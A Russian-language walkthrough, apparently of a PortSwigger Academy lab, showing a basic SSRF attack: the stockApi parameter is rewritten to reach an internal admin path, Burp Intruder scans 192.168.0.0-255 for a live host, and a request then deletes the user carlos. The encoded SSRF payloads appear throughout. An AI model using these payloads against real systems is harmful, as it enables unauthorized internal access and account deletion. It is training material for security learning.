Перейдем на случайный товар и нажмем `Сheck stock`
![img](https://github.com/adyatlove/PortSwiggerAcademy/blob/main/9.%20Server-side%20request%20forgery%20(SSRF)/2.%20Basic%20SSRF%20against%20another%20back-end%20system/pics%20for%20walktrough/1.png)

найдем в `Proxy` -> `HTTP history` и найдем тот самый запрос, который посылается в приложение при нажатии кнопки `Сheck stock` и отправим данный запрос в `Repeater`
```
POST /product/stock
...
stockApi=http%3A%2F%2F192.168.0.1%3A8080%2Fproduct%2Fstock%2Fcheck%3FproductId%3D8%26storeId%3D1
```
![img](https://github.com/adyatlove/PortSwiggerAcademy/blob/main/9.%20Server-side%20request%20forgery%20(SSRF)/2.%20Basic%20SSRF%20against%20another%20back-end%20system/pics%20for%20walktrough/2.png)

Увидим, что идет редирект на `192.168.0.1`, попробуем пробиться через параметр `stockApi` в админскую директорию
```
POST /product/stock
...
stockApi=http%3A%2F%2F192.168.0.1%3A8080%2Fadmin
```
![img](https://github.com/adyatlove/PortSwiggerAcademy/blob/main/9.%20Server-side%20request%20forgery%20(SSRF)/2.%20Basic%20SSRF%20against%20another%20back-end%20system/pics%20for%20walktrough/3.png)

Видим 400 респонс статус код, означающий недостаток прав. Отправим запрос в `Indruder`. Выполним поиск по другим ip-адресам в данной подсетке по simple list'у
```
stockApi=http%3A%2F%2F192.168.0.§1§%3A8080%2Fadmin
```
![img](https://github.com/adyatlove/PortSwiggerAcademy/blob/main/9.%20Server-side%20request%20forgery%20(SSRF)/2.%20Basic%20SSRF%20against%20another%20back-end%20system/pics%20for%20walktrough/4.png)

Выберем всю нулевую подсетку, соответсвенно посканим все от `0-255` и нажмем `Start attack`
![img](https://github.com/adyatlove/PortSwiggerAcademy/blob/main/9.%20Server-side%20request%20forgery%20(SSRF)/2.%20Basic%20SSRF%20against%20another%20back-end%20system/pics%20for%20walktrough/5.png)

Отсортируем по статус респонс коду, и увидим, что на 192.168.0.61 выдало 200 статус респонс код

![img](https://github.com/adyatlove/PortSwiggerAcademy/blob/main/9.%20Server-side%20request%20forgery%20(SSRF)/2.%20Basic%20SSRF%20against%20another%20back-end%20system/pics%20for%20walktrough/6.png)

Вернемся в `Repeater` и отправим запрос на `192.168.0.61` и админскую панель
```
POST /product/stock
...
stockApi=http%3A%2F%2F192.168.0.61%3A8080%2Fadmin
```
![img](https://github.com/adyatlove/PortSwiggerAcademy/blob/main/9.%20Server-side%20request%20forgery%20(SSRF)/2.%20Basic%20SSRF%20against%20another%20back-end%20system/pics%20for%20walktrough/7.png)

Удалим УЗ carlos согласно заданию, и получим уведомление об успешно выполненном задании

```
POST /product/stock
...
stockApi=http%3A%2F%2F192.168.0.61%3A8080%2Fadmin/delete?username=carlos
```
![img](https://github.com/adyatlove/PortSwiggerAcademy/blob/main/9.%20Server-side%20request%20forgery%20(SSRF)/2.%20Basic%20SSRF%20against%20another%20back-end%20system/pics%20for%20walktrough/8.png)
